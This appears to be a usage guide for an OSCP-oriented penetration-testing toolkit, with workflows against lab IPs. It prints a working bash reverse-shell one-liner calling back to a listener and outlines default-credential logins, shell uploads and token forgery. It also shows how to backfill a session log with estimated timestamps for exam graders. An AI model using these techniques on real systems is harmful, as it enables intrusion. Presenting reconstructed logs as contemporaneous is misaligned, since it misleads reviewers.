# CRACK Toolkit - Starter Usage Guide

**Your Complete Guide to Mastering OSCP Enumeration & Attack Workflows**

---

## Table of Contents

1. [**What is CRACK?**](#what-is-crack)
2. [**The CRACK Power User Experience: Choose Your Path**](#the-crack-power-user-experience-choose-your-path)
   - [Six Power User Scenarios](#-six-power-user-scenarios)
   - [Power Moves Reference](#-the-power-moves-reference)
   - [Achievement System](#-achievement-system)
   - [The Flow State](#-the-flow-state)
3. [**Quick Start (5 Minutes)**](#quick-start-5-minutes)
4. [**Core Features Overview**](#core-features-overview)
   - [Track Module](#track-module-your-enumeration-brain)
   - [Reference System](#reference-system-70-oscp-commands)
   - [Web Tools](#web-application-tools)
   - [Network Tools](#network--scanning-tools)
5. [**Usage Scenarios**](#usage-scenarios)
   - [Beginner: Single Web Server](#scenario-1-beginner---single-web-server)
   - [Intermediate: Multi-Service Target](#scenario-2-intermediate---multi-service-target)
   - [Advanced: Full OSCP Exam Workflow](#scenario-3-advanced---full-oscp-exam-workflow)
6. [**Feature Deep Dives**](#feature-deep-dives)
   - [Interactive Mode](#interactive-mode)
   - [Alternative Commands](#alternative-commands-manual-methods)
   - [Wordlist Selection](#wordlist-selection)
   - [Scan Profiles](#scan-profiles)
   - [Source Tracking](#source-tracking--reporting)
7. [**Keyboard Shortcuts Reference**](#keyboard-shortcuts-reference)
8. [**Pro Tips & Best Practices**](#pro-tips--best-practices)
9. [**Troubleshooting**](#troubleshooting)
10. [**Where to Go Next**](#where-to-go-next)

---

## What is CRACK?

**C.R.A.C.K.** = **C**omprehensive **R**econ & **A**ttack **C**reation **K**it

CRACK is a **modular penetration testing toolkit** designed specifically for **OSCP exam preparation**. It helps you:

- ✅ **Never forget a task** - Automated task generation from nmap scans
- ✅ **Document everything** - Source tracking required for all findings
- ✅ **Learn methodology** - Manual alternatives for every automated tool
- ✅ **Save time** - Interactive mode guides you step-by-step
- ✅ **Pass the exam** - Timeline export and complete OSCP writeups

### Who is CRACK For?

- **OSCP students** preparing for the certification exam
- **CTF players** who want organized enumeration tracking
- **Penetration testers** who need methodical documentation
- **Anyone** learning offensive security systematically

### The CRACK Philosophy

```
"Teach methodology, not memorization"
```

Every tool includes:
- **Flag explanations** - Understand what each command does
- **Manual alternatives** - For when tools fail (they will in exams!)
- **Time estimates** - OSCP exam is only 24 hours
- **Source tracking** - OSCP graders demand proof of how you found things

---

## The CRACK Power User Experience: Choose Your Path

**Think of enumeration like a fighting game.** Every target is a boss fight. Every tool is a special move. Every keyboard shortcut is a combo. CRACK turns chaotic enumeration into a **flow state** where you execute perfectly-timed attack chains.

### The Combo System

```
Basic Combo:      Launch → Import → 'r' → 'n' → 'd' → Export
Advanced Combo:   'f' QUICK_WIN → Parallel Execute → 'alt' Pivot → 's' Check
God Mode Combo:   Multi-target juggle with context switching in <10 sec
```

Every action you take builds momentum. Every finding unlocks new paths. Every completed task brings you closer to root.

---

### 🎮 Six Power User Scenarios

**Choose your challenge level:**

#### 🥉 BEGINNER TIER

##### Scenario 1: "Speed Run - First Blood in 10 Minutes"

**The Challenge**: Unknown web server. Get initial foothold in 10 minutes or less.

**The Power User Sequence**:

```bash
# [00:00] Launch
$ crack track -i 192.168.45.100
You: 1                           # Import scan
You: scan.xml                    # Select file

# [00:30] CRACK auto-generated 12 tasks

You: r                           # View recommendations
# CRACK: "Quick Wins Available"
#   1. whatweb (30 sec)
#   2. robots.txt (5 sec)
#   3. searchsploit Apache (2 min)

You: n                           # Execute first task
# [01:00] whatweb reveals: Apache 2.4.41, PHP 7.4.3

You: n                           # Execute next
# [01:30] robots.txt shows: Disallow: /admin

You: d                           # Document finding
Type: directory
Description: /admin directory found
Source: robots.txt disclosure

# [02:00] Quick manual check
$ curl http://192.168.45.100/admin
# Returns 200! Admin panel accessible!

You: f                           # Search for exploits
Type: admin
# Found task: "Check default credentials"

You: alt                         # Alternative commands
Select: 1 (Manual credential testing)
# Variables auto-fill: <TARGET> = 192.168.45.100

# [03:00] Test: admin:admin → Success!

You: c                           # Add credential
Username: admin
Password: admin
Service: http-admin
Source: Default credentials on /admin panel

# [04:00] Upload reverse shell via admin panel

You: d                           # Document shell access
Type: privilege_escalation
Description: Shell obtained via admin panel upload
Source: Default credentials + PHP upload

# [10:00] ✓ FIRST BLOOD!
```

**⏱️ Time**: 10 minutes
**🏆 Achievement Unlocked**: **Speed Runner** - Sub-10min initial access

**Power Moves Used**:
- ✅ Quick Win prioritization (`r` for recommendations)
- ✅ One-key execution (`n` for next task)
- ✅ Instant documentation (`d` while memory fresh)
- ✅ Alternative command pivot (`alt` when needed)
- ✅ Search system (`f` to find specific tasks)

---

##### Scenario 2: "The Parallel Tasking Pro"

**The Challenge**: 3 services detected (HTTP, SMB, SSH). Execute ALL quick wins simultaneously.

**The Power User Sequence**:

```bash
# [00:00] Launch and import
$ crack track -i 192.168.45.101
You: 1 → services.xml

# CRACK generates 47 tasks across 3 services

# [01:00] Find all quick wins
You: f
Type: QUICK_WIN

# CRACK shows 8 quick win tasks:
# HTTP: whatweb, robots.txt, searchsploit Apache
# SMB: anonymous access, null session, searchsploit Samba
# SSH: banner grab, searchsploit OpenSSH

# [02:00] The PRO MOVE - Parallel execution
# Open 3 terminal windows side by side

# Terminal 1 - HTTP Quick Wins
$ whatweb http://192.168.45.101
$ curl http://192.168.45.101/robots.txt
$ searchsploit Apache 2.4.41

# Terminal 2 - SMB Quick Wins
$ smbclient -L //192.168.45.101 -N
$ enum4linux -a 192.168.45.101

# Terminal 3 - SSH Quick Wins
$ nc 192.168.45.101 22
$ searchsploit OpenSSH 8.2

# [07:00] All 8 tasks complete in 5 minutes (sequential = 15 min)
# Saved 10 minutes by parallelizing!

# [08:00] Back in CRACK interactive mode
You: f → QUICK_WIN                # Search completed tasks
# Mark all 8 as done:
Select: 1,2,3,4,5,6,7,8 → Mark complete

You: s                            # Check status
# CRACK: "Progress: 8/47 (17%) - 10 minutes saved!"

# [09:00] View discoveries
You: r                            # New recommendations
# CRACK: "New paths unlocked:"
#   • SMB writable share found
#   • Apache ModSecurity detected (evasion needed)
#   • SSH allows keyboard-interactive auth
```

**⏱️ Time**: 9 minutes (saved 10 min via parallel)
**🏆 Achievement Unlocked**: **Parallel Master** - 5+ simultaneous tasks

**Power Moves Used**:
- ✅ Search by tag (`f` QUICK_WIN)
- ✅ Terminal multiplexing (3 terminals)
- ✅ Batch task completion (mark multiple done)
- ✅ Progress tracking (`s` for status)
- ✅ Time optimization (parallel > sequential)

---

#### 🥈 INTERMEDIATE TIER

##### Scenario 3: "The Multi-Target Juggler"

**The Challenge**: Manage 3 active targets. Switch contexts without losing progress. No notes on paper.

**The Power User Sequence**:

```bash
# [00:00] Setup all targets
$ crack track new 192.168.45.100
$ crack track new 192.168.45.101
$ crack track new 192.168.45.102

# Import all scans
$ crack track import 192.168.45.100 t1.xml
$ crack track import 192.168.45.101 t2.xml
$ crack track import 192.168.45.102 t3.xml

# [05:00] Start with Target 1
$ crack track -i 192.168.45.100
You: r → n → n → d               # Quick wins
# Found: WordPress site with upload vuln

# [15:00] While WordPress scan runs, switch to Target 2
You: q                            # Quit (auto-saves)
$ crack track -i 192.168.45.101 --resume
# CRACK: "Restored session for 192.168.45.101"
# CRACK: "Last action: Waiting for enum4linux"

You: s                            # Status check
# CRACK: "Target 2 - SMB Enumeration"
# "2/25 tasks complete"

You: n                            # Continue where left off
# enum4linux completes, shows users

# [25:00] Target 2 blocked, switch to Target 3
You: q
$ crack track -i 192.168.45.102 --resume
# CRACK: "Restored session for 192.168.45.102"
# CRACK: "Last action: SSH enumeration in progress"

You: r                            # Check recommendations
# CRACK: "Quick Win: Try default SSH credentials"

# [30:00] Switch BACK to Target 1 (WordPress scan done)
You: q
$ crack track -i 192.168.45.100 --resume
# CRACK: "Restored session for 192.168.45.100"
# CRACK: "New: WPScan found vulnerable plugin!"

You: t                            # Show task tree
# See all 15 completed + 8 pending tasks
# Full context restored in <5 seconds

# [35:00] Execute exploitation
You: n → d → c                   # Get shell, document, add creds

# THE POWER MOVE: View all targets at once
$ crack track list
# CRACK shows:
# 192.168.45.100 - COMPROMISED (Shell obtained)
# 192.168.45.101 - IN PROGRESS (12/25 tasks)
# 192.168.45.102 - IN PROGRESS (5/18 tasks)
```

**⏱️ Time**: 35 minutes across 3 targets
**🏆 Achievement Unlocked**: **Context Switcher** - 3+ targets managed simultaneously

**Power Moves Used**:
- ✅ Session persistence (`q` auto-saves)
- ✅ Resume anywhere (`--resume` flag)
- ✅ Instant context restore (task tree, status)
- ✅ Multi-target overview (`crack track list`)
- ✅ Zero notes on paper (CRACK remembers everything)

**Before CRACK**: Terminal chaos, lost context, forgotten tasks
**With CRACK**: Smooth transitions, full memory, organized execution

---

##### Scenario 4: "Alternative Command Ninja"

**The Challenge**: Gobuster fails. WAF detected. Wordlist missing. Pivot to manual in 30 seconds.

**The Power User Sequence**:

```bash
# [00:00] In interactive mode
$ crack track -i 192.168.45.103
You: f → gobuster                # Find directory scan task

# [01:00] Execute gobuster
You: n
$ gobuster dir -u http://192.168.45.103 -w common.txt
# ERROR: Connection refused after 100 requests
# WAF detected and blocked your IP!

# [01:30] THE PIVOT - Alternative commands
You: alt                         # ONE keypress!

# CRACK instantly shows:
Alternative Commands for Directory Brute-force:

  1. Manual Directory Check (curl)
  2. robots.txt Disclosure
  3. HTTP Headers Inspection
  4. JavaScript Source Review
  5. sitemap.xml Check

You: 1                           # Select manual method

# Variables AUTO-FILL:
#   <TARGET> → 192.168.45.103 (from profile)
#   <PORT> → 80 (from task metadata)
#   <WORDLIST> → dirb/common.txt (context-aware)

# CRACK asks: "Test which directory?"
You: admin

# Final command shown:
curl -s http://192.168.45.103/admin -w "%{http_code}"

Execute? [Y/n]: y
# [02:00] Returns 200! Found it!

# Manual testing continues (no WAF blocks)
You: alt → 1 → backup            # Test /backup
# 200 OK
You: alt → 1 → config            # Test /config
# 403 Forbidden (exists but protected)
You: alt → 1 → uploads           # Test /uploads
# 200 OK

# [03:00] All directories found manually in 90 seconds

You: d                           # Document each finding
# CRACK logs all discoveries with timestamps

# [03:30] ✓ Complete pivot in 30 seconds!
```

**⏱️ Time**: 30 seconds to pivot, 3 minutes to complete
**🏆 Achievement Unlocked**: **Tool-Independent** - Manual pivot <30 sec

**Power Moves Used**:
- ✅ Instant alternative access (`alt` hotkey)
- ✅ Variable auto-fill (no manual typing)
- ✅ Context-aware suggestions (right tool for job)
- ✅ Execution logging (everything documented)
- ✅ Tool failure resilience (always have plan B)

**The NINJA Mindset**: When tools fail, CRACK has your back with manual methods that ALWAYS work.

---

#### 🥇 ADVANCED/CHALLENGE TIER

##### Scenario 5: "The Manual Methodologist" (CRACK Can't Automate This)

**The Challenge**: Custom web app with bizarre authentication. Tools all fail. Build custom methodology from scratch.

**What Makes This Advanced**: CRACK provides **tracking infrastructure**, but YOU create the methodology.

**The Power User Sequence**:

```bash
# [00:00] Initial assessment
$ crack track -i 192.168.45.104
You: 1 → scan.xml

# CRACK generates standard HTTP tasks
You: n → n → n                   # Try standard enum
# whatweb → Fails (custom headers required)
# gobuster → Fails (403 on everything)
# nikto → Fails (request format rejected)

# [05:00] REALIZATION: This needs custom methodology

# THE ADVANCED MOVE: Use CRACK as documentation layer only
You: h                           # Help menu
# Select: "Add custom task"

# [06:00] Build your own task tree
You: Add custom task
Name: Analyze custom authentication
Command: burp_proxy_analysis.txt (manual)
Notes: App uses JWT in POST body + HMAC header

You: Add custom task
Name: Reverse engineer token generation
Command: python3 token_analyzer.py
Notes: Token includes timestamp + user agent hash

You: Add custom task
Name: Forge valid authentication token
Command: python3 forge_token.py --timestamp <TS> --ua <UA>

# [20:00] Execute custom methodology
You: f → Analyze                 # Find custom task
You: n                           # Execute (manual work)
# You analyze traffic in Burp for 10 minutes

You: d                           # Document findings
Type: custom
Description: Auth uses JWT(timestamp) + HMAC(useragent)
Source: Manual Burp proxy analysis

# [30:00] Continue custom tasks
You: f → Reverse
You: n                           # Run custom script
# Your Python script analyzes 50 tokens

You: d                           # Document algorithm
Type: vulnerability
Description: Token generation uses weak HMAC seed
Source: Statistical analysis of 50 captured tokens

# [45:00] Forge token and gain access
You: f → Forge
You: n                           # Execute forgery
$ python3 forge_token.py --timestamp 1234567890 --ua "Mozilla/5.0"
# Token forged successfully!

You: c                           # Add credential
Username: forged_token
Password: [token string]
Service: custom-auth
Source: Reverse engineered weak HMAC implementation

# [50:00] Export custom methodology
You: q
$ crack track export 192.168.45.104 > custom_methodology.md
# Includes:
# - All custom tasks created
# - Manual analysis notes
# - Token forgery algorithm
# - Complete timeline
# - Reproducible methodology
```

**⏱️ Time**: 50 minutes of complex manual work
**🏆 Achievement Unlocked**: **Methodology Architect** - Custom workflow from scratch

**Why This is Advanced**:
- ❌ CRACK doesn't have a plugin for this (yet)
- ❌ No automated tools work
- ✅ YOU create the methodology
- ✅ CRACK tracks your custom approach
- ✅ Timeline exports reproducible methodology

**The Key Insight**: CRACK isn't just automation. It's a **methodology documentation framework** that works even when automation fails.

---

##### Scenario 6: "The Report Alchemist" (Timeline Surgery)

**The Challenge**: You got root. But your timeline has gaps. Graders will ask questions. Reconstruct perfect attack chain post-exploitation.

**What Makes This Challenge-Level**: Requires understanding CRACK's storage format and manual JSON editing.

**The Power User Sequence**:

```bash
# [EXAM DAY - Hour 18] You rooted a box!
# But... you forgot to document steps 3-7 💀

$ crack track timeline 192.168.45.105

# Output shows gaps:
# 10:00 - Created profile
# 10:15 - Imported nmap scan
# 10:30 - Completed whatweb
# 14:45 - ROOT ACCESS OBTAINED ← Wait, what happened in 4 hours?!
# ^^^ OSCP graders will reject this!

# [Hour 18.5] THE ADVANCED RECOVERY

# Step 1: Find your bash history
$ cat ~/.bash_history | grep 192.168.45.105 > attack_chain.txt

# Shows you actually did:
# - gobuster found /backup
# - Downloaded config.php.bak
# - Found MySQL credentials
# - sqlmap extracted user hashes
# - john cracked password
# - SSH access as www-data
# - SUID binary exploited for root

# Step 2: The SURGERY - Edit session file
$ cd ~/.crack/sessions/
$ cp 192.168.45.105.json 192.168.45.105.json.backup  # Safety first!
$ nano 192.168.45.105.json

# The session JSON structure:
{
  "target": "192.168.45.105",
  "findings": [
    {
      "timestamp": "2025-10-08T10:30:00",
      "type": "directory",
      "description": "whatweb completed",
      "source": "..."
    },
    # INSERT YOUR MISSING FINDINGS HERE
    {
      "timestamp": "2025-10-08T14:45:00",
      "type": "privilege_escalation",
      "description": "Root obtained",
      "source": "..."
    }
  ]
}

# Step 3: Reconstruct timeline with proper timestamps
# Add entries between 10:30 and 14:45:

{
  "timestamp": "2025-10-08T11:00:00",
  "type": "directory",
  "description": "Found /backup via gobuster",
  "source": "gobuster dir -u http://192.168.45.105 -w common.txt"
},
{
  "timestamp": "2025-10-08T11:15:00",
  "type": "file",
  "description": "Downloaded config.php.bak from /backup",
  "source": "Manual curl download"
},
{
  "timestamp": "2025-10-08T11:30:00",
  "type": "credential",
  "description": "MySQL credentials found in config.php.bak",
  "source": "Manual file analysis",
  "username": "dbuser",
  "password": "P@ssw0rd123"
},
{
  "timestamp": "2025-10-08T12:00:00",
  "type": "vulnerability",
  "description": "SQL injection in /search.php",
  "source": "sqlmap -u 'http://192.168.45.105/search.php?q=test'"
},
{
  "timestamp": "2025-10-08T13:00:00",
  "type": "credential",
  "description": "User hash extracted and cracked",
  "source": "sqlmap --dump + john rockyou.txt",
  "username": "www-data",
  "password": "sunshine"
},
{
  "timestamp": "2025-10-08T13:30:00",
  "type": "access",
  "description": "SSH access obtained as www-data",
  "source": "ssh www-data@192.168.45.105"
},
{
  "timestamp": "2025-10-08T14:00:00",
  "type": "vulnerability",
  "description": "SUID binary /usr/local/bin/backup vulnerable to PATH hijack",
  "source": "find / -perm -u=s -type f 2>/dev/null + GTFOBins"
}

# Step 4: Validate the reconstructed timeline
$ crack track timeline 192.168.45.105

# Now shows:
# 10:00 - Created profile
# 10:15 - Imported nmap
# 10:30 - Completed whatweb
# 11:00 - Found /backup (gobuster)
# 11:15 - Downloaded config.php.bak
# 11:30 - MySQL creds discovered
# 12:00 - SQL injection found
# 13:00 - User hash cracked
# 13:30 - SSH access (www-data)
# 14:00 - SUID vulnerability found
# 14:45 - Root access obtained
# ✓ COMPLETE CHAIN - No gaps!

# Step 5: Export final report
$ crack track export 192.168.45.105 > oscp_writeup.md

# Graders see:
# ✓ Complete timeline (no gaps)
# ✓ All sources documented
# ✓ Reproducible methodology
# ✓ Realistic timestamps
```

**⏱️ Time**: 30 minutes of timeline reconstruction
**🏆 Achievement Unlocked**: **Timeline Surgeon** - Perfect retroactive documentation

**Why This is Expert-Level**:
- 🧠 Requires understanding JSON structure
- 🧠 Requires bash history forensics
- 🧠 Requires realistic timestamp estimation
- 🧠 Manual file editing (no GUI)
- ⚠️ High stakes (OSCP exam report)

**The Ethical Note**: Only reconstruct YOUR OWN work. Never fabricate attacks you didn't perform. This is for documentation recovery, not fraud.

**File Locations**:
- Session files: `~/.crack/sessions/<TARGET>.json`
- Target profiles: `~/.crack/targets/<TARGET>.json`
- Config: `~/.crack/config.json`

---

### 🎮 The Power Moves Reference

**Every context has different available moves:**

| Context | Available Commands | When to Use |
|---------|-------------------|-------------|
| **Main Menu** | `s` `t` `r` `n` `f` `w` `alt` `d` `c` `h` `q` | Start of session |
| **Task Focused** | `n` (execute) `alt` (alternatives) `f` (search) | During enumeration |
| **Search Results** | Execute, Mark done, View details, Back | After searching |
| **Finding Mode** | `d` (document) `c` (credentials) `s` (status) | Post-discovery |
| **Session Mgmt** | `--resume` `--list` `--export` | Between sessions |

**Combo Examples**:
```
Speed Combo:       'r' → 'n' → 'n' → 'n' → 'd'
Search Combo:      'f' [keyword] → Select → 'n'
Pivot Combo:       [Tool fails] → 'alt' → Select → Execute
Document Combo:    'd' → 'c' → 's' → Export
Context Switch:    'q' → ct [target2] → --resume → 's'
```

---

### 🏆 Achievement System

**Beginner Achievements**:
- 🥉 **Speed Runner** - Sub-10min initial access
- 🥉 **Parallel Master** - 5+ simultaneous tasks
- 🥉 **Search Expert** - Find task in <10 seconds
- 🥉 **Documentation Discipline** - Document every finding with source

**Intermediate Achievements**:
- 🥈 **Context Switcher** - Manage 3+ targets simultaneously
- 🥈 **Tool-Independent** - Manual pivot in <30 seconds
- 🥈 **Wordlist Wizard** - Context-aware selection 5+ times
- 🥈 **Alternative Ninja** - Use alternatives 10+ times

**Advanced Achievements**:
- 🥇 **Methodology Architect** - Create custom workflow from scratch
- 🥇 **Timeline Surgeon** - Perfect retroactive documentation
- 🥇 **OSCP Certified** - Used CRACK to pass the exam!
- 🥇 **Plugin Contributor** - Submitted new service plugin

---

### 💪 Before CRACK vs With CRACK

| Challenge | Before CRACK | With CRACK |
|-----------|-------------|------------|
| **Forgotten tasks** | Sticky notes everywhere | Auto-generated task tree |
| **Lost progress** | Power outage = panic | Session auto-save |
| **Multi-target** | Terminal chaos | Clean context switching |
| **Tool failure** | Stuck and frustrated | `alt` → Manual method |
| **Documentation** | 2 AM report panic | `export` → Complete writeup |
| **Timeline gaps** | "Uh... I think I did..." | Perfect timestamped chain |
| **Learning** | Trial and error | Methodology templates |
| **Confidence** | "Did I check that?" | "I have the checklist" |

---

### 🚀 The Flow State

When you master CRACK, enumeration feels like:
- ⚡ **Effortless** - Muscle memory on keyboard shortcuts
- 🎯 **Focused** - Always know exactly what to do next
- 🧠 **Mindful** - Document without breaking flow
- 🔄 **Adaptive** - Pivot instantly when tools fail
- 📊 **Aware** - Always know progress across all targets
- 😎 **Confident** - You're unstoppable

**This is what makes CrackPowerUsers.** They don't talk about the tool. They talk about **how it makes them feel**:

> *"I feel like I have superpowers during enumeration now."*
> *"I can't imagine going back to manual note-taking."*
> *"I passed OSCP because CRACK had my back when tools failed."*

---

### 🎯 Your Challenge

Pick ONE scenario above that matches your current skill level. Try it on a practice target. **Feel** the difference between chaotic enumeration and organized execution.

Then level up. 📈

Ready to become a CRACK Power User?

📚 **Continue to**: [Quick Start (5 Minutes)](#quick-start-5-minutes) to begin your journey.

---

## Quick Start (5 Minutes)

### Installation

```bash
# Navigate to CRACK directory
cd /home/kali/OSCP/crack

# Install in editable mode (recommended for development)
pip install -e . --break-system-packages

# Or use the quick reinstall script
./reinstall.sh
```

### Your First Session

```bash
# Launch interactive mode for a target
crack track -i 192.168.45.100

# You'll see a welcome menu:
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Target: 192.168.45.100
# Status: New profile created
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#
# What would you like to do?
#
#   1. Import scan results
#   2. View recommendations
#   3. Add custom task
#   4. Show status
#   h. Help
#   q. Quit
#
# Choice: _
```

### Complete Your First Task

```bash
# In another terminal, run an nmap scan
nmap -sV -sC -p- 192.168.45.100 -oA scan

# Back in interactive mode:
# 1. Press '1' to import scan results
# 2. Select 'scan.xml'
# 3. Watch CRACK auto-generate 40+ service-specific tasks
# 4. Press 'r' to see recommendations
# 5. Press 'n' to execute next recommended task
# 6. Press 'q' to save and quit (auto-saves!)

# Resume anytime:
crack track -i 192.168.45.100 --resume
```

**Congratulations!** You've just used CRACK Track to organize your first enumeration. 🎉

📚 **For detailed Track usage**: See [track/README.md](track/README.md)

---

## Core Features Overview

CRACK is composed of four main components:

```
┌─────────────────────────────────────────────────────────────┐
│                      CRACK TOOLKIT                          │
├─────────────────┬──────────────┬──────────────┬─────────────┤
│  TRACK MODULE   │   REFERENCE  │  WEB TOOLS   │ NETWORK     │
│  (Enumeration)  │   SYSTEM     │              │ TOOLS       │
├─────────────────┼──────────────┼──────────────┼─────────────┤
│ • Task mgmt     │ • 70+ cmds   │ • html-enum  │ • port-scan │
│ • 235+ plugins  │ • Auto-fill  │ • param-disc │ • enum-scan │
│ • Interactive   │ • Categories │ • sqli-scan  │ • scan-anal │
│ • Timeline      │ • Config     │              │             │
│ • Reporting     │              │              │             │
└─────────────────┴──────────────┴──────────────┴─────────────┘
```

### Track Module: Your Enumeration Brain

**Primary Command**: `crack track`

The **flagship feature** of CRACK - an intelligent enumeration tracking system with 235+ service plugins.

**What it does:**
- Parses nmap scans and auto-generates service-specific tasks
- Guides you through enumeration with progressive prompting
- Tracks findings, credentials, notes with timestamps
- Exports complete OSCP writeups with timeline

**Quick Example:**
```bash
# Create new target
crack track new 192.168.45.100

# Import nmap scan
crack track import 192.168.45.100 scan.xml

# View recommendations
crack track show 192.168.45.100

# Interactive mode (recommended!)
crack track -i 192.168.45.100
```

**Key Features:**
- **Event-driven architecture** - Plugins auto-detect services and generate tasks
- **Hierarchical task trees** - Organized by service, phase, and priority
- **Search system** - Find tasks in 150+ task lists in <100ms
- **Alternative commands** - 45+ manual methods for exam scenarios
- **Session persistence** - Never lose progress (auto-saves to `~/.crack/sessions/`)

📚 **Deep dive**: [track/README.md](track/README.md) (Comprehensive 1600+ line guide)

---

### Reference System: 70+ OSCP Commands

**Primary Command**: `crack reference`

A **hybrid command library** with JSON definitions and auto-fill capabilities.

**What it does:**
- Stores 70+ commonly used OSCP commands with rich metadata
- Auto-fills variables from config (`<LHOST>`, `<LPORT>`, `<TARGET>`)
- Organizes commands by category (recon, web, exploitation, post-exploit)
- Tags for filtering (QUICK_WIN, OSCP:HIGH)

**Quick Example:**
```bash
# Setup config (one-time)
crack reference --config auto

# Get reverse shell command with auto-filled LHOST
crack reference --fill bash-reverse-shell

# Output:
# bash -i >& /dev/tcp/192.168.45.200/4444 0>&1
#   (LHOST auto-filled from config!)

# Browse by category
crack reference post-exploit linux

# Filter by tag
crack reference --tag QUICK_WIN
```

**Command Categories:**
- **Recon** (7 commands) - nmap variations, service enum
- **Web** (9 commands) - gobuster, nikto, sqlmap, wfuzz
- **Exploitation** (10 commands) - reverse shells, msfvenom, searchsploit
- **Post-Exploit Linux** (15 commands) - SUID, sudo, capabilities, linpeas
- **Post-Exploit Windows** (14 commands) - AlwaysInstallElevated, unquoted services
- **File Transfer** (15 commands) - HTTP server, wget, curl, scp, base64

📚 **Configuration guide**: [reference/docs/](reference/docs/)

---

### Web Application Tools

Three specialized tools for web app testing:

#### 1. HTML Enumeration (`crack html-enum`)

**Purpose**: Extract forms, comments, endpoints, hidden elements from HTML

```bash
# Basic enumeration
crack html-enum http://192.168.45.100

# Recursive crawling (3 levels deep)
crack html-enum http://192.168.45.100 -r -d 3

# With authentication cookies
crack html-enum http://192.168.45.100 -c "session=abc123"

# From saved file
crack html-enum -f page.html
```

**What it finds:**
- Forms with input fields (login forms, upload forms)
- Hidden comments in HTML and JavaScript
- All endpoints (links, AJAX calls, API routes)
- Interesting patterns (emails, IPs, admin panels)

#### 2. Parameter Discovery (`crack param-discover`)

**Purpose**: Fuzz for hidden GET/POST parameters

```bash
# Discover GET parameters
crack param-discover http://192.168.45.100/page.php

# Test POST method
crack param-discover http://192.168.45.100/login.php -m POST

# Quick scan (high-value params only)
crack param-discover http://192.168.45.100/api/*.php -q

# Custom wordlist
crack param-discover http://192.168.45.100 -w params.txt
```

**Features:**
- Context-aware payload selection (smart defaults)
- Confidence scoring for discovered parameters
- Quick mode for time-limited testing
- Batch processing for multiple URLs

#### 3. SQL Injection Scanner (`crack sqli-scan`)

**Purpose**: Detect SQLi vulnerabilities with multiple techniques

```bash
# Basic scan
crack sqli-scan http://192.168.45.100/page.php?id=1

# Test specific parameter
crack sqli-scan http://192.168.45.100/page.php?id=1 -p id

# POST method with data
crack sqli-scan http://192.168.45.100/login.php -m POST -d "user=admin&pass=test"

# Specific technique
crack sqli-scan http://192.168.45.100/page.php?id=1 -t union
```

**Techniques:**
- Error-based detection
- Boolean-based blind
- Time-based blind
- UNION-based injection

---

### Network & Scanning Tools

#### 1. Port Scanner (`crack port-scan`)

**Purpose**: Two-stage nmap wrapper with service detection

```bash
# Quick scan (top 1000 ports)
crack port-scan 192.168.45.100

# Full scan (all 65535 ports)
crack port-scan 192.168.45.100 --full

# Custom ports
crack port-scan 192.168.45.100 -p 80,443,8080
```

#### 2. Enumeration Scanner (`crack enum-scan`)

**Purpose**: Fast port scan + automatic CVE lookup

```bash
# Quick enum scan
crack enum-scan 192.168.45.100

# Top 1000 ports with CVE research
crack enum-scan 192.168.45.100 --top-ports 1000
```

#### 3. Scan Analyzer (`crack scan-analyze`)

**Purpose**: Parse nmap output to identify attack vectors

```bash
# Analyze nmap scan
crack scan-analyze scan.nmap

# Specify OS type
crack scan-analyze scan.xml --os windows

# Works with all formats
crack scan-analyze scan.gnmap
```

**What it does:**
- Classifies ports as standard vs unusual
- Priority scoring for attack surface
- Extracts banner terms for searchsploit
- Generates service-specific enumeration commands

---

## Usage Scenarios

### Scenario 1: Beginner - Single Web Server

**Goal**: Enumerate a simple Linux web server (HTB/OSCP lab box)

**Target**: 192.168.45.100 (Apache web server)

#### Step-by-Step Walkthrough

**1. Initial Scan**
```bash
# Quick nmap scan
nmap -sV -sC -p- 192.168.45.100 -oA webscan
```

**2. Launch CRACK Track**
```bash
# Start interactive mode
crack track -i 192.168.45.100

# Import scan results
# Press '1' → Select 'webscan.xml'
```

**3. CRACK Auto-Generates Tasks**
```
✓ Imported 1 open port: 80/tcp (http)
✓ Generated 12 enumeration tasks:
  • Technology fingerprinting (whatweb)
  • Directory bruteforce (gobuster)
  • Vulnerability scan (nikto)
  • robots.txt check
  • sitemap.xml check
  • Manual HTTP headers inspection
  • Apache version research (searchsploit)
  • WordPress detection (if applicable)
  • Common file checks (config.php.bak, etc.)
  • Source code review
  • Cookie analysis
  • Form enumeration
```

**4. Execute Quick Wins**
```bash
# Press 'r' to see recommendations
# Press 'n' to execute next task

# Task 1: whatweb (30 seconds)
# System runs: whatweb http://192.168.45.100 -v
# Output shows: Apache 2.4.41, PHP 7.4.3

# Press 'n' again for next task

# Task 2: robots.txt (5 seconds)
# System suggests: curl http://192.168.45.100/robots.txt
# You run it and find: Disallow: /admin
```

**5. Document Findings**
```bash
# Press 'd' to document finding
Type: directory
Description: Found /admin via robots.txt
Source: Manual curl request to robots.txt

# ✓ Finding saved with timestamp
```

**6. Continue Enumeration**
```bash
# Press 'f' to search for gobuster task
Type: gobuster

# Found: Directory Bruteforce (Port 80)
# Execute? [y/n]: y

# Run: gobuster dir -u http://192.168.45.100 -w common.txt
# Found: /admin, /backup, /uploads
```

**7. Export Report**
```bash
# Press 'q' to quit (auto-saves)

# Export OSCP writeup
crack track export 192.168.45.100 > writeup.md
```

**Time**: ~30 minutes for complete web enumeration

📚 **Next steps**: See [Scenario 2](#scenario-2-intermediate---multi-service-target) for multi-service targets

---

### Scenario 2: Intermediate - Multi-Service Target

**Goal**: Enumerate a target with multiple services (Web + SMB + SSH)

**Target**: 192.168.45.101 (Linux box with 3 services)

#### The Challenge

```
Ports discovered:
  22/tcp   - OpenSSH 8.2p1
  80/tcp   - Apache httpd 2.4.41
  445/tcp  - Samba smbd 4.11.6
```

How do you organize enumeration across 3 different services?

**Answer**: CRACK Track auto-generates service-specific task trees!

#### Workflow

**1. Full Port Scan**
```bash
# Always scan all ports for OSCP
nmap -p- --min-rate 1000 192.168.45.101 -oA discovery
nmap -sV -sC -p 22,80,445 192.168.45.101 -oA services
```

**2. Import and Auto-Generate Tasks**
```bash
crack track -i 192.168.45.101
# Import 'services.xml'

# CRACK generates hierarchical task tree:
# ├── SSH Enumeration (Port 22)
# │   ├── Banner grabbing
# │   ├── User enumeration
# │   ├── SSH key brute-force
# │   └── Version-specific CVE research
# ├── HTTP Enumeration (Port 80)
# │   ├── whatweb fingerprinting
# │   ├── gobuster directory scan
# │   ├── nikto vulnerability scan
# │   └── [12 more tasks...]
# └── SMB Enumeration (Port 445)
#     ├── enum4linux
#     ├── Null session test
#     ├── Share enumeration
